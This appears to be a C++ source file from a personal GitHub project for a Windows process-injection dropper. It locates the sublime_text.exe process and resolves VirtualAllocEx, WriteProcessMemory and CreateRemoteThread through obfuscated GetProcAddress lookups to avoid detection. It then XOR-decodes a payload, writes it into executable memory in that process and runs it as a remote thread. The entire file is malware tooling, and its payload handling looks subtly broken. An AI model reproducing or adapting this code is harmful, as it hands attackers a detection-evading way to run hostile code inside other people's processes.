/*
	Author:		lemur
	Email:		1emvr@protonmail.com
	GitHub:		https://github.com/1emvr/
	Date:		01.12.2023		05:08 AM

	Process injection (dropper) with obfuscation of the WINAPI calls	
	
	Primitive definitions: 
	https://learn.microsoft.com/en-us/windows/win32/api

*/
#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <memoryapi.h>

#include <cstdint>
#include <string>
#include <iostream>

#include "resource.h"
using namespace std;

DWORD GetProcessId(wstring processName) {
	
	PROCESSENTRY32 processEntryList;
	processEntryList.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		return 0;
	}
	Process32First(hSnapshot, &processEntryList);
	if (!processName.compare(processEntryList.szExeFile)) {
		CloseHandle(hSnapshot);
		return processEntryList.th32ProcessID;
	}
	while (Process32Next(hSnapshot, &processEntryList)) {
		if (!processName.compare(processEntryList.szExeFile)) {
			CloseHandle(hSnapshot);
			return processEntryList.th32ProcessID;
		}
	}
	CloseHandle(hSnapshot);
	return 0;
}

int main(void) {

	typedef LPVOID(WINAPI* VirtualAllocEx_t)(
		HANDLE hProcess, 
		LPVOID lpAddress, 
		SIZE_T dwSize, 
		DWORD flAllocationType, 
		DWORD flProtect
	);
	typedef BOOL(WINAPI* WriteProcessMemory_t)(
		HANDLE hProcess, 
		LPVOID lpBaseAddress, 
		LPCVOID lpBuffer, 
		SIZE_T nSize, 
		SIZE_T* lpNumberOfBytesWritten
	);
	typedef HANDLE(WINAPI* CreateRemoteThread_t)(
		HANDLE hProcess, 
		LPSECURITY_ATTRIBUTES lpThreadAttributes, 
		SIZE_T dwStackSize, 
		LPTHREAD_START_ROUTINE lpStartAddress, 
		LPVOID lpParameter, 
		DWORD dwCreationFlags, 
		LPDWORD lpThreadId
	);

	//Sleep(5000);

	wstring processName = L"sublime_text.exe";
	DWORD pid = GetProcessId(processName);
	HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE, TRUE, pid);

	HMODULE hFunctionCall = LoadLibrary((LPCWSTR)sKernel32);
	VirtualAllocEx_t pVirtualAllocEx = (VirtualAllocEx_t)GetProcAddress(hFunctionCall, (LPCSTR)sVirtualAllocEx);
	LPVOID hRemoteShellcode = pVirtualAllocEx(hProcess, NULL, payloadLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	u_char hPayload = XorCipher(payload, payloadLen, key, keylen);
	WriteProcessMemory_t pWriteProcessMemory = (WriteProcessMemory_t)GetProcAddress(hFunctionCall, (LPCSTR)sWriteProcessMemory);
	pWriteProcessMemory(hProcess, hRemoteShellcode, (LPCVOID)hPayload, payloadLen, NULL); // thrown
	
	CreateRemoteThread_t pCreateRemoteThread = (CreateRemoteThread_t)GetProcAddress(hFunctionCall, (LPCSTR)sCreateRemoteThread);
	HANDLE hThread = pCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)hRemoteShellcode, NULL, 0, NULL);

	CloseHandle(hProcess);
	return 0;
}
